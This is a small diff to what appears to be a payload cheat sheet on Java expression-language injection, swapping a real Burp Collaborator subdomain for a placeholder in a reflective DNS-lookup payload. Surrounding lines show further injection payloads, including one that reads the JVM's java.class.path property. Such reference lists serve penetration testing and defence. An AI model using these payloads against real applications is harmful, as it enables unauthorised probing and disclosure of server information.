@@ -153,7 +153,7 @@ ${1+1}
 
 ```java
 // DNS Lookup
-${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net")}
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
 
 // JVM System Property Lookup (ex: java.class.path)
 ${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
